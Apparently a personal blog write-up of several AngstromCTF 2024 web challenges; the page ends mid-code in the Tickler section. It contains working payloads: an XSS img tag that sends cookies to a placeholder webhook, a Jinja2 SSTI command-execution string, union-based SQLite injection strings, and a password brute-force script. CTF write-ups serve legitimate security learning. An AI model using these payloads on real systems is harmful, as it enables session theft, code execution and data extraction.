<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>AngstromCTF2024 | My New Hugo Site</title>
<meta name="keywords" content="">
<meta name="description" content="TL;DR
This is a writeup for some web challenge for AngstromCTF 2024
Spinner
const message = async () =&gt; {
    if (state.flagged) return
    const element = document.querySelector(&#39;.message&#39;)
    element.textContent = Math.floor(state.total / 360)
    if (state.total &gt;= 10_000 * 360) {
        state.flagged = true
        const response = await fetch(&#39;/falg&#39;, { method: &#39;POST&#39; })
        element.textContent = await response.text()
    }
}
message()
We can simply make POST request to /falg or using the console to assign the state.total to any number larger than stated above.
Markdown
There are no filtering or any encoding use while parsing the HTML, so this is a simple XSS.">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/writeups/angstromctf-2024/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.9de45e225101e4f99701d2b68fc6b8a1ef6027928be6391fa15bf7f56326c909.css" integrity="sha256-neReIlEB5PmXAdK2j8a4oe9gJ5KL5jkfoVv39WMmyQk=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/angstromctf-2024/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="My New Hugo Site (Alt + H)">My New Hugo Site</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/blogs/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/writeups/" title="Writeups">
                    <span>Writeups</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      AngstromCTF2024
    </h1>
    <div class="post-meta"><span title='2025-02-05 15:18:06 +0700 +07'>February 5, 2025</span>

</div>
  </header> 
  <div class="post-content"><h2 id="tldr">TL;DR<a hidden class="anchor" aria-hidden="true" href="#tldr">#</a></h2>
<p>This is a writeup for some web challenge for AngstromCTF 2024</p>
<h2 id="spinner">Spinner<a hidden class="anchor" aria-hidden="true" href="#spinner">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">message</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">flagged</span>) <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">element</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;.message&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">floor</span>(<span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">total</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">360</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">total</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">10_000</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">360</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">state</span>.<span style="color:#a6e22e">flagged</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/falg&#39;</span>, { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span> })
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">element</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">text</span>()
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">message</span>()
</span></span></code></pre></div><p>We can simply make POST request to /falg or using the console to assign the state.total to any number larger than stated above.</p>
<h2 id="markdown">Markdown<a hidden class="anchor" aria-hidden="true" href="#markdown">#</a></h2>
<p>There are no filtering or any encoding use while parsing the HTML, so this is a simple XSS.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/view/:id&#39;</span>, (<span style="color:#a6e22e">_req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">marked</span> <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;https://cdnjs.cloudflare.com/ajax/libs/marked/4.2.2/marked.min.js&#39;</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#39;text/html&#39;</span>).<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">`
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;div class=&#34;content&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;script src=&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">marked</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;&lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            const content = document.querySelector(&#39;.content&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            const id = document.location.pathname.split(&#39;/&#39;).pop()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            delete (async () =&gt; {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                const response = await fetch(\`/content/\${id}\`)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                const text = await response.text()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                content.innerHTML = marked.parse(text)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            })()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/script&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    `</span>)
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>A simple img tag can help us retrieve the cookie.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;location=&#39;WEBHOOK/?c=&#39;+document.cookie&#34;</span>&gt;
</span></span></code></pre></div><p>And finally make a GET request to get the flag.</p>
<h2 id="winds">Winds<a hidden class="anchor" aria-hidden="true" href="#winds">#</a></h2>
<p>This is an Jinja2 SSTI challenge, which they used render_template_string with untrusted data.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.post</span>(<span style="color:#e6db74">&#39;/shout&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shout</span>():
</span></span><span style="display:flex;"><span>    text <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;text&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> text:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#39;/?error=No message provided...&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    jumbled <span style="color:#f92672">=</span> list(text)
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>shuffle(jumbled)
</span></span><span style="display:flex;"><span>    jumbled <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(jumbled)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template_string(<span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;link rel=&#34;stylesheet&#34; href=&#34;/style.css&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;div class=&#34;content&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;h1&gt;The windy hills&lt;/h1&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;form action=&#34;/shout&#34; method=&#34;POST&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;input type=&#34;text&#34; name=&#34;text&#34; placeholder=&#34;Hello!&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &lt;input type=&#34;submit&#34; value=&#34;Shout your message...&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/form&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;div style=&#34;color: red;&#34;&gt;{{ error }}&lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                Your voice echoes back: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;/div&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span> <span style="color:#f92672">%</span> jumbled, error<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;error&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>))
</span></span></code></pre></div><p>The tricky part was that the text was shuffle, but with the seed 0, we could preshuffle the payload so that it worked.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">unshuffle</span>(text):
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    a <span style="color:#f92672">=</span> list(range(len(text)))
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>shuffle(a)
</span></span><span style="display:flex;"><span>    new_text <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;X&#39;</span><span style="color:#f92672">*</span>len(text)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(text)):
</span></span><span style="display:flex;"><span>        new_text <span style="color:#f92672">=</span> text[i] <span style="color:#f92672">+</span> new_text[a[i]<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:]
</span></span><span style="display:flex;"><span>    jumbled <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(text[a<span style="color:#f92672">.</span>index(i)] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(text)))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jumbled
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{{ cycler.__init__.__globals__.os.popen(&#39;cat flag.txt&#39;).read() }}&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">shuffler</span>(payload):
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>seed(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    jumbled <span style="color:#f92672">=</span> list(payload)
</span></span><span style="display:flex;"><span>    random<span style="color:#f92672">.</span>shuffle(jumbled)
</span></span><span style="display:flex;"><span>    jumbled <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(jumbled)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jumbled
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>a  <span style="color:#f92672">=</span> unshuffle(payload)
</span></span><span style="display:flex;"><span>print(a)
</span></span></code></pre></div><h2 id="store">Store<a hidden class="anchor" aria-hidden="true" href="#store">#</a></h2>
<p>Firstly, I doubted this is an SQLi challenge. Making POST request with <code>item=a' or 1;-- -</code>.
I was able to identify the database which is SQLite thanks to this <code>item=a' or sqlite_version()=sqlite_version();-- -</code>.
will return everything. By trying union select, I knew the number of column of the table and the context of each column. <code>item=a' union select 'a','b','c';-- -</code>.
So following cheatsheet helped me find all the tables name <code>item=a' union select 'a','a',(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%');-- -</code>.
We got a table whose name flags&hellip; Bingo !!!
Enumerated the columns <code>item=a' union select 'a','a',(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flags...');-- -</code>
And finally retrieved the flag.</p>
<h2 id="pastebin">Pastebin<a hidden class="anchor" aria-hidden="true" href="#pastebin">#</a></h2>
<h3 id="first-finding">First finding<a hidden class="anchor" aria-hidden="true" href="#first-finding">#</a></h3>
<p>This challenge is quite interesting.
At first, I didn&rsquo;t know that secrets is a built-in library of python. I though it is something like secrets.py or so. And secrets.token_hex is a function.
Running str(secrets.token_hex) will get us <code>&lt;function token_hex at 0x7fb85f4c2520&gt;</code>. Ahhhh, address.
The /view endpoint with id=0 will get us the flag, if we got the MD5 password or the first 3 bytes of the MD5 password.</p>
<h3 id="idsomething">id(something)<a hidden class="anchor" aria-hidden="true" href="#idsomething">#</a></h3>
<p>This function will get the address of the thing we put in.</p>
<h3 id="solve">Solve<a hidden class="anchor" aria-hidden="true" href="#solve">#</a></h3>
<p>Why not bruteforcing the address. I thought that the address of the secrets.token_hex can be bruteforce. Combining with the hash 3 bytes, we could get the real password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> tqdm <span style="color:#f92672">import</span> tqdm
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>base <span style="color:#f92672">=</span> <span style="color:#ae81ff">135598372746984</span>
</span></span><span style="display:flex;"><span>ADMIN_PASSWORD_head <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1797c2&#39;</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Brute up&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> tqdm(range(<span style="color:#ae81ff">100_000_000</span>)):
</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;password-&lt;function token_hex at </span><span style="color:#e6db74">{</span>hex(base<span style="color:#f92672">+</span>i)<span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;&#39;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> h[:<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> ADMIN_PASSWORD_head:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Found: </span><span style="color:#e6db74">{</span>hex(base<span style="color:#f92672">+</span>i)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;h: </span><span style="color:#e6db74">{</span>h<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Brute down&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> tqdm(range(<span style="color:#ae81ff">100_000_000</span>)):
</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;password-&lt;function token_hex at </span><span style="color:#e6db74">{</span>hex(base<span style="color:#f92672">-</span>i)<span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;&#39;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> h[:<span style="color:#ae81ff">6</span>] <span style="color:#f92672">==</span> ADMIN_PASSWORD_head:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Found: </span><span style="color:#e6db74">{</span>hex(base<span style="color:#f92672">-</span>i)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;h: </span><span style="color:#e6db74">{</span>h<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>There were a few collision, but anyways, after 10 minutes and some try and error, you will get the flag.</p>
<h2 id="tickler">Tickler<a hidden class="anchor" aria-hidden="true" href="#tickler">#</a></h2>
<p>This is annother client-side challenge with CSP.</p>
<h3 id="csp">CSP<a hidden class="anchor" aria-hidden="true" href="#csp">#</a></h3>
<p>The CSP was set to <code>script-src 'self'</code>. What is self?
<code>'self'</code> : Refers to the origin from which the protected document is being served, including the same URL scheme and port number.</p>
<h3 id="html-injection">HTML Injection<a hidden class="anchor" aria-hidden="true" href="#html-injection">#</a></h3>
<p>In client.js, we saw this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#e6db74">&#34;/login&#34;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">async</span> () =&gt; {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">form</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;form&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">error</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#34;p&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URLSearchParams</span>(window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">has</span>(<span style="color:#e6db74">&#34;error&#34;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;error&#34;</span>) <span style="color:#f92672">??</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#34;submit&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">event</span>) =&gt; {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">event</span>.<span style="color:#a6e22e">preventDefault</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">elements</span>.<span style="color:#a6e22e">namedItem</span>(<span style="color:#e6db74">&#34;n&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">form</span>.<span style="color:#a6e22e">elements</span>.<span style="color:#a6e22e">namedItem</span>(<span style="color:#e6db74">&#34;p&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">doLogin</span>.<span style="color:#a6e22e">mutate</span>({
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">username</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">username</span>.<span style="color:#a6e22e">value</span>,
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">password</span>.<span style="color:#a6e22e">value</span>
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">success</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">textContent</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`Login failed. </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">message</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">setItem</span>(<span style="color:#e6db74">&#34;username&#34;</span>, <span style="color:#a6e22e">username</span>.<span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">localStorage</span>.<span style="color:#a6e22e">setItem</span>(<span style="color:#e6db74">&#34;password&#34;</span>, <span style="color:#a6e22e">password</span>.<span style="color:#a6e22e">value</span>);
</span></span><span style="display:flex;"><span>          window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    });
</span></span><span style="display:flex;"><span>},
</span></span></code></pre></div><p>So, by <code>/login?error=&lt;h1&gt;hehe&lt;/h1&gt;</code>, we got our HTML Injection.</p>
<h3 id="simple-xss-right">Simple XSS (right?)<a hidden class="anchor" aria-hidden="true" href="#simple-xss-right">#</a></h3>
<p>Will a simple</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>worked?
NO. It would be blocked by CSP. Maybe we need to upload something so that we could refer to it and not trigger CSP.
In server.ts, it has an endpoint which is /api/setPicture. and this is helpful. But it read data and base64 encode them, how can deal with this?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-typescript" data-lang="typescript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">buffer</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Blob</span>(<span style="color:#a6e22e">data</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">array</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">buffer</span>.<span style="color:#a6e22e">arrayBuffer</span>()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">base64</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#66d9ef">from</span>(<span style="color:#a6e22e">array</span>).<span style="color:#a6e22e">toString</span>(<span style="color:#e6db74">&#39;base64&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pictures</span>.<span style="color:#66d9ef">set</span>(<span style="color:#a6e22e">ctx</span>.<span style="color:#a6e22e">user</span>, {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">data</span>: <span style="color:#66d9ef">base64</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">type</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">response</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#66d9ef">get</span>(<span style="color:#e6db74">&#39;content-type&#39;</span>) <span style="color:#f92672">??</span> <span style="color:#e6db74">&#39;image/png&#39;</span>,
</span></span><span style="display:flex;"><span>})
